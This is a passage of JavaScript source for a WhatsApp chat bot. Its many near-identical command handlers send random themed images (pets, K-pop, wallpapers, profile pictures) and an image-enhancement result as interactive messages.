}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'aesthetic':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'antiwork':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'blackpink':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'bike':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'boneka':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cosplay':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cat':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'doggo':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'justina':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'kayes':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'kpop':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'notnot':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'car':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
ToxxicTechInc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
ToxxicTechInc.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pubg':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'rose':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ryujin':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ulzzangboy':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ulzzanggirl':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallpaperphone': case 'wallphone':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
            case 'remini': {
			if (!quoted) return newReply(`Where is the picture?`)
			if (!/image/.test(mime)) return newReply(`Send/Reply Photos With Captions ${prefix + command}`)
			await hana()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😍\",\"id\":\""}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
			}
			break
			case 'define': 
